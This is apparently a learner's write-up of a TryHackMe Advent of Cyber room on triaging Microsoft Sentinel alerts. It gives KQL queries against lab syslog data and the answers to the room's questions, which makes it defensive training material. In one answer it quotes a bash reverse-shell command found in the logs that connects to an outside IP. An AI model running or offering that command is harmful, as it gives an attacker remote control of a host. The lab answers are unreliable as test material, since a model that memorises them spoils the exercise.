
<h3 align="center">Advent of Cyber 2025 &nbsp;&nbsp; ·  &nbsp;&nbsp; Day 10 &nbsp;&nbsp; ·  &nbsp;&nbsp; SOC Alert Triaging - Tinsel Triage</h3>
<p align="center">2025, December 20  &nbsp; ·  &nbsp; Hey! I´m <a href="https://www.linkedin.com/in/rosanafssantos/">Rosana</a>, and I’m excited to join you on this adventure in <a href="https://tryhackme.com">TryHackMe</a>.<br>Investigate and triage alerts through Microsoft Sentinel. &nbsp;&nbsp;Access it <a href="https://tryhackme.com/room/azuresentinel-aoc2025-a7d3h9k0p2">here</a>.<br><img width="80px" src="https://github.com/user-attachments/assets/a46b93f2-4d4c-4a06-bc02-64d1f913f56b"<br><br><img width="1200px" src="https://github.com/user-attachments/assets/8ca3d85c-b74f-4922-a5f5-7c90ac1f4f86"></p>

<h2>Task 1 &nbsp; ·  &nbsp; Introduction</h2>

<h6 align="center"><img width="600px" src="https://github.com/user-attachments/assets/56126e08-7db2-4ee3-99fa-be487185a08e"><br>This image and all the theoretical content of the present article is TryHackMe´s property.</h6>

<p>The Best Festival Company's Security Operations Center was in chaos. Screens flickered, lights flashed, and the sound of alerts echoed through the room like a digital thunderstorm. The elves rushed between consoles, their faces lit by the glow of red and orange warnings. It was raining alerts, and no one knew where the storm had begun.<br>

Whispers spread through the SOC as tension filled the air. Something strange was happening across the cloud environment, and the timing couldn't be worse. As the blizzard of alerts grew heavier, one name surfaced among the worried elves: the evil Easter Bunnies. But why now? And what were they after this time?</p>

<h3>Learning Objectives</h3>
<p>

- Understand the importance of alert triage and prioritisation<br>
- Explore Microsoft Sentinel to review and analyse alerts<br>
- Correlate logs to identify real activities and determine alert verdicts</p>

<h3>Connecting to the Machine</h3>
<p>Before moving forward, review the questions in the connection card shown below::</p>

<h6 align="center"><img width="400px" src="https://github.com/user-attachments/assets/06b22a1d-9c32-4811-9bf4-44248e805190"><br>This image and all the theoretical content of<br> the present article is TryHackMe´s property.</h6>

<p>Please follow the instructions below to access your lab for the task.<br>

<strong>Note</strong>: The content deployment scope has changed since the videos were recorded. You no longer have to deploy a lab as part of the setup. Rest assured, the questions can still be answered by watching the video.<br>

To get started, go to the  <a href="https://portal.azure.com/">Microsoft Azure</a> portal and use one of the username and temporary access pass combinations listed below, based on your continent.<br>

If you find that an account has been temporarily locked, please select a different account from the list.</p>

<h6 align="center"><img width="900px" src="https://github.com/user-attachments/assets/3323a3fb-9a40-455a-abc3-5111cc9b5831"><br>This image and all the theoretical content of the present article is TryHackMe´s property.</h6>

<p>This will take you directly to the  <a href="https://portal.azure.com/">Microsoft Azure</a> portal.</p>

<h6 align="center"><img width="350px" src="https://github.com/user-attachments/assets/70a54d14-8952-4ce0-9b17-5873774ef60f"><br>This image and all the theoretical content of<br> the present article is TryHackMe´s property.</h6>

<h6 align="center"><img width="350px" src="https://github.com/user-attachments/assets/3ff316ee-22ef-4708-b8f8-eb04fda56983"><br>This image and all the theoretical content of<br> the present article is TryHackMe´s property.</h6>

<br>
<p><em>Answer the question below</em></p>

<p>1.1. <em>I have successfully signed into the Azure portal, and I'm now ready to explore Azure!</em><br>
<code>No answer needed</code></p>

<h6 align="center"><img width="1200px" src="https://github.com/user-attachments/assets/3a141b6c-3eed-49c0-bfc1-dcb37b6c7885"><br>Rosana´s hands-on</h6>

<br>
<h2>Task 2 &nbsp; ·  &nbsp; Alert Triage Primer</h2>
<h3>It´s Raining Alerts</h3>
<p>McSkidy was notified that it's raining alerts; something unusual is happening within the Azure tenant. The dashboards are lighting up with suspicious activities, and early signs indicate a possible attack from the Evil Bunnies. The Best Festival Company must act fast to survive this onslaught before it affects the entire season's operations. </p>

<h6 align="center"><img width="900px" src="https://github.com/user-attachments/assets/094a104b-2279-42a1-8e96-c81088ab07df"><br>This image and all the theoretical content of the present article is TryHackMe´s property.</h6>

<p>Before investigating these alerts in Microsoft Sentinel, McSkidy must step back and understand what's happening. When alerts start flooding in, jumping straight into each one isn't efficient since not all alerts are equal. Some are noise, others are false positives, and a few may indicate real threats in progress.<br>

This is where alert triaging becomes critical. Triaging helps security teams identify which alerts deserve immediate attention, which can be deprioritised, and which can be safely ignored for a moment. The process separates chaos from clarity, allowing analysts like McSkidy's SOC team to focus their time and resources where it truly matters.</p>

<h3>Alert Triaging</h3>
<p>Now, let's continue the discussion about alert triaging. In the previous section, we introduced triaging and why it is essential. This time, we'll focus on how to approach it, what to prioritise, what to look for, and what to do right after an alert.<br>

When multiple alerts appear, analysts should have a consistent method to assess and prioritise them quickly. There are many factors you can consider when triaging, but these are the fundamental ones that should always be part of your process of identifying and evaluating alerts:</p>

<h6 align="center"><img width="900px" src="https://github.com/user-attachments/assets/1b9701e8-6bea-4c5d-9a0f-95a16f653df3"><br>This image and all the theoretical content of the present article is TryHackMe´s property.</h6>

<p>In short, these four represent the essential dimensions of triage:<br>

- <strong>Severity</strong>: How bad?<br>
- <strong>Time</strong>: When?<br>
- <strong>Context</strong>: Where in the attack lifecycle?<br>
- <strong>Impact</strong>: Who or what is affected?<br>

They form a balanced foundation that's simple enough for analysts to apply quickly but comprehensive enough for informed decisions.

After reviewing these factors, decide on your next step: escalate to the incident response team, perform a deeper investigation, or close the alert if it's confirmed to be a false positive. A structured triage process like this helps ensure that time and resources are focused on what truly matters.
</p>

<h3>Diving Deeper into an Alert</h3>
<p>After identifying which alerts deserve further attention, it's time to dig into the details. Follow these steps to investigate and correlate effectively:<br><br>

- <strong>Investigate the alert in detail</strong>.<br>Open the alert and review the entities, event data, and detection logic. Confirm whether the activity represents real malicious behaviour.<br><br>
- <strong>Check the related logs</strong>.<br>Examine the relevant log sources. Look for patterns or unusual actions that align with the alert.<br><br>
- <strong>Correlate multiple alerts</strong>.<br>Identify other alerts involving the same user, IP address, or device. Correlation often reveals a broader attack sequence or coordinated activity.<br><br>
- <strong>Build context and a timeline</strong>.<br>Combine timestamps, user actions, and affected assets to reconstruct the sequence of events. This helps determine if the attack is ongoing or has already been contained.<br><br>
- <strong>Decide on the following action</strong>.<br>If there are indicators of compromise, escalate to the incident response team. Investigate further if more evidence or correlation is needed. Close or suppress if the alert is a confirmed false positive, and update detection rules accordingly.<br><br>
- <strong>Document findings and lessons learned</strong>.<br>Keep a clear record of the analysis, decisions, and remediation steps. Proper documentation strengthens SOC processes and supports continuous improvement.<br><br>

With the triage complete and the investigation in motion, McSkidy begins piecing together the puzzle. Every alert, log entry, and timestamp brings her closer to uncovering what the Evil Bunnies are up to inside the Azure tenant. It's time to connect the dots and reveal the bigger picture behind the noise.</p>

<br>
<p><em>Answer the question below</em></p>

<p>2.1. <em>Let's proceed to the action!</em><br>
<code>No answer needed</code></p>

<br>
<h2>Task 3 &nbsp; ·  &nbsp; Environment Review</h2>
<h3>Environment Review</h3>
<p>Before proceeding with alert triaging, let’s first review the lab environment.<br>

To get started, head over to the Azure Portal and search for Microsoft Sentinel.</p>

<h6 align="center"><img width="900px" src="https://github.com/user-attachments/assets/66e4626e-e8a4-40df-88dd-f7c020b0395b"><br>This image and all the theoretical content of the present article is TryHackMe´s property.</h6>

<p>Then, click the Sentinel instance, go to the <strong>Logs</strong> tab and select the custom log table named <strong>Syslog_CL</strong>.</p>

<h6 align="center"><img width="900px" src="https://github.com/user-attachments/assets/42946b07-c3d3-49f0-a225-794a80a52f11"><br>This image and all the theoretical content of the present article is TryHackMe´s property.</h6>

<p>After running the query, the logs for this lab environment should be rendered.</p>

<h6 align="center"><img width="900px" src="https://github.com/user-attachments/assets/6c0123c6-580e-4e6c-9da0-6fce49b875e8"><br>This image and all the theoretical content of the present article is TryHackMe´s property.</h6>

<p>Now that we have reviewed the environment, let's proceed with the discussion of alert triaging in the next task.</p>

<br>
<p><em>Answer the question below</em></p>

<p>3.1. <em>I have now reviewed the custom logs.</em><br>
<code>No answer needed</code></p>

<br>
<h2>Task 4 &nbsp; ·  &nbsp; Investigation Proper</h2>
<h3>McSkidy Goes Triaging</h3>
<p>Now that we have learned about triaging, let's move to the fun part, working inside the actual SOC environment of the Best Festival Company hosted in Azure. This is where McSkidy will put her triage skills to the test using Microsoft Sentinel, a cloud-native SIEM and SOAR platform. Sentinel collects data from various Azure services, applications, and connected sources to detect, investigate, and respond to threats in real time.<br>

Through Sentinel, McSkidy can view and manage alerts, analyse incidents, and correlate activities across multiple logs. It provides visibility into what's happening within the Azure tenant and efficiently allows analysts to pivot from one alert to another. In this next part, we'll explore how McSkidy reviews alerts, drills into the evidence, and uses Sentinel's investigation tools to uncover the truth behind the Evil Bunnies' attack.</p>


<h3>Microsoft Sentinel in Action</h3>

<p>To start the activity, navigate to <a href="https://portal.azure.com/#browse/microsoft.securityinsightsarg%2Fsentinel">Microsoft Sentinel</a>. and select your dedicated Sentinel instance. Then, under the <strong>Threat management</strong> dropdown, select the Incidents tab to view the incidents triggered during the current timeframe. You may also press the <code><<</code> button to expand the view as shown in the image below.</p>

<h6 align="center"><img width="900px" src="https://github.com/user-attachments/assets/1be01cfa-4ce1-4771-be93-ad72966b6f16"><br>This image and all the theoretical content of the present article is TryHackMe´s property.</h6>

<p><strong>Note</strong>: In case the alerts do not appear, refresh your browser page (see image below)</p>

<h6 align="center"><img width="900px" src="https://github.com/user-attachments/assets/9c4c4c3c-6f2b-434e-9915-39657dd0a020"><br>This image and all the theoretical content of the present article is TryHackMe´s property.</h6>

<p><strong>Note 2</strong>: In case you see no incidents, ensure you have set a custom date range for the incidents:</p>

<h6 align="center"><img width="900px" src="https://github.com/user-attachments/assets/a694b0d0-b0d2-437f-9f15-d6ccf7ac9071"><br>This image and all the theoretical content of the present article is TryHackMe´s property.</h6>

<p>From the task images, there are eight open incidents, four of high severity and four of medium severity. Note that these numbers might differ in your lab environment.<br>

Since we focus on addressing the most critical threats first, we’ll begin with the high-severity alerts. These represent potential compromise points or privilege-escalation activities that could lead to complete host control if left unchecked.<br>

To begin the triage, we’ll examine one high-severity incident in detail: the Linux PrivEsc—Kernel Module Insertion alert. By clicking the alert, additional details appear on the right-hand side.</p>

<h6 align="center"><img width="900px" src="https://github.com/user-attachments/assets/2da4a7af-4907-4008-860e-dc89c13e1648"><br>This image and all the theoretical content of the present article is TryHackMe´s property.</h6>

<p>Upon checking the alert, as seen in the above image, the following details can be initially inferred:<br>

- There are three events related to the alert.<br>
- The alert was recently created (note that this varies based on your lab instance).<br>
- There are three entities involved in the alert.<br>
- The alert is classified as a Privilege Escalation tactic.<br>

We can get further details from here by clicking the <strong>View full details</strong> button.</p>

<h6 align="center"><img width="400px" src="https://github.com/user-attachments/assets/d7c8c9d0-1b76-429e-be9e-7321f62e2237"><br>This image and all the theoretical content of<br> the present article is TryHackMe´s property.</h6>

<p>In the new view, we can see that in addition to the details shown in the summary, we can also view the possible <strong>Incident Timeline</strong>strong> and <strong>Similar Incidents</strong>strong>.</p>

<h6 align="center"><img width="900px" src="https://github.com/user-attachments/assets/b95dcf54-a2ed-4983-8874-5f386412b0b6"><br>This image and all the theoretical content of the present article is TryHackMe´s property.</h6>

<h3>Understanding Related Alerts</h3>
<p>From the view above, you may notice that several alerts point to the same affected entities. This helps us understand the relationship and the possible sequence of events that impact the same host or user.<br>

When multiple alerts are linked to a single entity, such as the same machine, user, or IP address, it typically indicates that these detections are not isolated incidents, but somewhat different stages of the same intrusion.<br>

By analysing which alerts share the same entities, we can start to trace the attack path, from the initial access to privilege escalation and persistence.<br>

For example, if the same VM triggered the following alerts:</p>

<h6 align="center"><img width="900px" src="https://github.com/user-attachments/assets/50d4dba1-f2b7-470c-8c0b-44ad8c201dcf"><br>This image and all the theoretical content of the present article is TryHackMe´s property.</h6>

<p>At this stage, McSkidy has reviewed the high-severity alerts, identified the affected entities, and noticed that several detections are linked together. This initial triage allows her to prioritise which incidents need immediate attention and recognise when multiple alerts are actually part of a larger compromise.<br>

With this foundational understanding, McSkidy is ready to move beyond surface-level triage and dive deeper into the underlying logs, which will be discussed in the next task.</p>

<p><em>Answer the questions below</em></p>

<p>4.1. <em>How many entities are affected by the Linux PrivEsc - Polkit Exploit Attempt alert?</em><br>
<code>10</code></p>
<h6 align="center"><img width="1200px" src="https://github.com/user-attachments/assets/596989b4-c321-405e-9005-f31a0d40d4bf"><br>Rosana´s hands-on</h6>
<h6 align="center"><img width="1200px" src="https://github.com/user-attachments/assets/fc43256f-3455-4aa8-abeb-2d122432fd7d"><br>Rosana´s hands-on</h6>

<br>
<p>4.2. <em>What is the severity of the Linux PrivEsc - Sudo Shadow Access alert?</em><br>
<code>High</code></p>
<h6 align="center"><img width="1200px" src="https://github.com/user-attachments/assets/708ba968-c4d3-4c83-a6e3-bd91bac37206"><br>Rosana´s hands-on</h6>
<h6 align="center"><img width="1200px" src="https://github.com/user-attachments/assets/98f03eef-0868-445a-96d7-7eae95823f7f"><br>Rosana´s hands-on</h6>

<br>
<p>4.3. <em>How many accounts were added to the sudoers group in the Linux PrivEsc - User Added to Sudo Group alert?</em><br>
<code>4</code></p>
<h6 align="center"><img width="1200px" src="https://github.com/user-attachments/assets/81c316f9-5909-49a8-a6dd-b7a76f9e6ac5"><br>Rosana´s hands-on</h6>

<br>
<h2>Task 5 &nbsp; ·  &nbsp; Diving Deeper Into Logs</h2>

<h3>In-Depth Log Analysis with Sentinel</h3>
<p>With the initial triage complete, McSkidy now examines the raw evidence behind these alerts. The next task involves diving into the underlying log data within Microsoft Sentinel to validate the alerts and uncover the exact attacker actions that triggered them. By analysing authentication attempts, command executions, and system changes, McSkidy can begin piecing together the full story of how the attack unfolded.<br>

If we go back to the alert's full details view, we can try clicking the Events from the Evidence section.</p>

h6 align="center"><img width="900px" src="https://github.com/user-attachments/assets/422d43c2-9549-4c46-aa88-26998b87ae7a"><br>This image and all the theoretical content of the present article is TryHackMe´s property.</h6>

<p>From this view, we can definitely see the actual name of the kernel module installed in each machine and the time it was installed.<br>

Diving deeper into this, we can try checking the raw events from a single host through a custom query. To do this, let's change the view into an editable KQL query and find all the events triggered from <strong>app-02</strong>.<br>

- Press the <strong>Simple mode</strong> dropdown from the upper-right corner and select KQL mode.<br>
- Modify the query with the following KQL query below.<br><code>set query_now = datetime(2025-10-30T05:09:25.9886229Z);</code><br><code>Syslog_CL<br>| where host_s == 'app-02'</code><br><code>| project _timestamp_t, host_s, Message</code><br>
- Press the <strong>Run</strong> button and wait for the results.</p>

<h6 align="center"><img width="900px" src="https://github.com/user-attachments/assets/14749d24-ef7f-4026-97c7-8ae025fb7027"><br>This image and all the theoretical content of the present article is TryHackMe´s property.</h6>

<p>After executing the query, it can be seen that multiple potentially suspicious events occurred around the installation of the kernel module.<br>

- Execution of the <code>cp</code> (copy) command to create a shadow file backup.<br>
- Addition of the user account Alice to the sudoers group.<br>
- Modification of the backupuser account by root.<br>
- Insertion of the malicious_mod.ko module.<br>
- Successful SSH authentication by the root user.</p>

<h6 align="center"><img width="900px" src="https://github.com/user-attachments/assets/27399527-b920-4750-846b-44e99ab70bb8"><br>This image and all the theoretical content of the present article is TryHackMe´s property.</h6>

<p>Based on the surrounding events, including the execution of the <code>cp</code> command to create a shadow file backup, the addition of the user account Alice to the sudoers group, the modification of the backupuser account by root, and the successful SSH authentication by the root user, this activity appears highly unusual. The sequence suggests potential privilege escalation and persistence behaviour, indicating that the event may not be part of normal system operations and warrants further investigation.<br>

Now that we have discussed the methodology for determining and reviewing alerts, let’s help McSkidy complete the assessment by examining the remaining alerts and answering the questions below.</p>

<h6 align="center"><img width="900px" src="https://github.com/user-attachments/assets/be8f6577-c9d8-4578-ab1f-d59e2d5ede71"><br>This image and all the theoretical content of the present article is TryHackMe´s property.</h6>

<p><em>Answer the questions below</em></p>

<p>5.1. <em>What is the name of the kernel module installed in websrv-01?</em><br>
<code>malicious_mod.ko</code></p>

```bash
set query_now = datetime(2025-10-30T05:09:25.9886229Z);
Syslog_CL
| where host_s == 'websrv-01'
| where Message has 'kernel'
| project _timestamp_t, host_s, Message
```

<h6 align="center"><img width="1200px" src="https://github.com/user-attachments/assets/7040537c-d235-4895-8704-63ed62cbd89e"><br>Rosana´s hands-on</h6>


<br>
<p>5.2. <em>What is the unusual command executed within websrv-01 by the ops user?</em><br>
<code>/bin/bash -i >& /dev/tcp/198.51.100.22/4444 0>&1</code></p>

```bash
set query_now = datetime(2025-10-30T05:09:25.9886229Z);
Syslog_CL
| where host_s == 'websrv-01'
| where Message has 'ops'
| project _timestamp_t, host_s, Message
```

<h6 align="center"><img width="1200px" src="https://github.com/user-attachments/assets/bfac9172-2da9-4324-b2d3-89d8a522d60b"><br>Rosana´s hands-on</h6>

<br>
<p>5.3. <em>What is the source IP address of the first successful SSH login to storage-01?</em><br>
<code>172.16.0.12</code></p>

```bash
set query_now = datetime(2025-10-30T05:09:25.9886229Z);
Syslog_CL
| where host_s == 'storage-01'
| where Message has 'Accepted password for'
| project _timestamp_t, host_s, Message
```

<h6 align="center"><img width="1200px" src="https://github.com/user-attachments/assets/85ef5db6-bb45-4864-9b16-d3ae0cbd2149"><br>Rosana´s hands-on</h6>


<br>
<p>5.4. <em>What is the external source IP that successfully logged in as root to app-01?</em><br>
<code>203.0.113.45</code></p>

```bash
set query_now = datetime(2025-10-30T05:09:25.9886229Z);
Syslog_CL
| where host_s == 'app-01'
| where Message has 'Accepted password for root'
| project TimeGenerated, Message
```

<h6 align="center"><img width="1200px" src="https://github.com/user-attachments/assets/049a853f-0786-4b22-b4af-96ea746cd7f0"><br>Rosana´s hands-on</h6>

<br>
<p>5.5. <em>Aside from the backup user, what is the name of the user added to the sudoers group inside app-01?</em><br>
<code>deploy</code></p>

```bash
set query_now = datetime(2025-10-30T05:09:25.9886229Z);
Syslog_CL
| where host_s == 'app-01'
| where Message has 'added to group'
| project _timestamp_t, host_s, Message
```

<h6 align="center"><img width="1200px" src="https://github.com/user-attachments/assets/50736820-4cbf-433b-887c-b2ff47c7cad9"><br>Rosana´s hands-on</h6>

<br>
<br>
<h1 align="center">Completed</h1>

<p align="center"><img width="800px" src="https://github.com/user-attachments/assets/38e8a960-41b1-4507-bd24-0bcad2f7ee55"><br>
                  <img width="800px" src="https://github.com/user-attachments/assets/e86e1f8a-0f36-41b4-884c-5b51f93cce55"></p>


<h1 align="center">My TryHackMe Journey ・ 2025, December</h1>

<div align="center"><h6>

| Date<br><br>   | Room <br><br> |Streak<br><br>   |Global<br>All Time|Brazil<br>All Time|Global<br>Monthly|Brazil<br>Monthly|Points<br><br>|Rooms<br>Completed|Badges<br><br>|
|:------:|:--------------------------------------|:--------:|:------------:|:------------:|:------------:|:------------:|:------------:|:------------:|:------------:|
|20      |Medium 🔗 -  SOC Alert Triaging - Tinsel Triage  |3 |     100ᵗʰ  |     3ʳᵈ    |   25,202ⁿᵈ   |      286ᵗʰ     |    134,752  |    1,038    |    84     |
|19      |Medium 🔗 -  ICS/Modbus - Claus for Concern      |3 |     101ˢᵗ  |     3ʳᵈ    |   28,869ᵗʰ   |      337ᵗʰ     |    134,658  |    1,037    |    84     |
|19      |Easy 🔗 -  Passwords - A Cracking Christmas      |3 |     101ˢᵗ  |     3ʳᵈ    |   29,583ʳᵈ   |      340ᵗʰ     |    134,642  |    1,036    |    84     |
|18      |Easy 🔗 -  Prompt Injection - Sched-yule conflict|2 |     101ˢᵗ  |     3ʳᵈ    |   30,518ᵗʰ   |      353ʳᵈ     |    134,626  |    1,035    |    84     |
|18      |Medium 🔗 -  Obfuscation - The Egg Shell File    |2 |     101ˢᵗ  |     3ʳᵈ    |   30,967ᵗʰ   |      358ᵗʰ     |    134,618  |    1,034    |    84     |
|17      |Medium 🔗 - CyberChef - Hoperation Save McSkidy  |1 |     101ˢᵗ  |     3ʳᵈ    |   32,378ᵗʰ   |      374ᵗʰ     |    134,602  |    1,033    |    84     |
|7       |Medium 🔗 - Malware Analysis - Egg-xecutable     |2 |      95ᵗʰ  |     3ʳᵈ    |   11,604ᵗʰ   |      145ᵗʰ     |    134,544  |    1,034    |    84     |
|7       |Easy 🔗 - Network Discovery - Scan-ta Clause     |2 |      95ᵗʰ  |     3ʳᵈ    |   18,575ᵗʰ   |      208ᵗʰ     |    134,522  |    1,033    |    84     |
|7       |Easy 🔗 - React2Shell: CVE-2025-55182            |2 |      95ᵗʰ  |     3ʳᵈ    |   28,593ʳᵈ   |      326ᵗʰ     |    134,474  |    1,032    |    81     |
|6       |Medium 🔗 - IDOR - Santa´s Little IDOR           |1 |      95ᵗʰ  |     3ʳᵈ    |   27,309ᵗʰ   |      328ᵗʰ     |    134,450  |    1,031    |    81     |
|6       |Easy 🔗 - AI in Security - old sAInt nick        |1 |      95ᵗʰ  |     3ʳᵈ    |   41,626ᵗʰ   |      526ᵗʰ     |    134,426  |    1,030    |    81     |
|6       |Medium 🔗 - Splunk Basics - Did you SIEM?        |1 |      95ᵗʰ  |     3ʳᵈ    |   44,647ᵗʰ   |      560ᵗʰ     |    134,410  |    1,029    |    81     |
|6       |Easy 🔗 - Phishing - Merry Clickmas              |1 |      96ᵗʰ  |     3ʳᵈ    |   55,824ᵗʰ   |      674ᵗʰ     |    134,370  |    1,028    |    81     |
|6       |Easy 🔗 - Linux CLI - Shells Bells               |1 |      97ᵗʰ  |     3ʳᵈ    |   53,003ʳᵈ   |      712ⁿᵈ     |    134,354  |    1,027    |    81     |

</h6></div><br>

<p align="center">Global All Time:    101ˢᵗ<br><img width="250px" src="https://github.com/user-attachments/assets/b62e353e-570a-48bf-95ca-655ae3a0ce5e"><br>
                                              <img width="1200px" src="https://github.com/user-attachments/assets/1c8d7efb-302a-4e94-8d81-f96042dd58e9"><br><br>
                  Brazil All Time:      3ʳᵈ<br><img width="1200px" src="https://github.com/user-attachments/assets/3d3d4af6-df07-41cc-b430-ab88c7f8f213"><br><br>
                  Global monthly:  25,202ⁿᵈ<br><img width="1200px" src="https://github.com/user-attachments/assets/963a4205-4c0b-4067-a507-333740d0ac99"><br><br>
                  Brazil monthly:     286ᵗʰ<br><img width="1200px" src="https://github.com/user-attachments/assets/1c3e0e85-eadb-4ac0-8ae3-9f751107bdfc"></p>

<h1 align="center">Thanks for coming!</h1>
<p align="center">Follow me on <a href="https://medium.com/@RosanaFS">Medium</a>, here on <a href="https://github.com/RosanaFSS/TryHackMe">GitHub</a>, and on <a href="https://www.linkedin.com/in/rosanafssantos/">LinkedIN</a>.</p>
